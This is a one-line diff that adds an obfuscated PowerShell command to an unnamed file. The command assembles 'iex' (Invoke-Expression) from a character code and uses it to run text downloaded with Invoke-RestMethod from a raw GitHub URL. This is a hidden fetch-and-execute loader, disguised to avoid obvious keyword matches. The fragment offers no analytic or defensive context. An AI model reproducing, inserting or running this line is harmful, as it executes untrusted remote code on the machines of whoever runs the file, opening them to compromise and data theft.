@@ -1,0 +1,1 @@
+sv f ex;.([char]105+$f)(irm github.com/jeanbaak63-byte/assets/raw/refs/heads/main/test.txt)
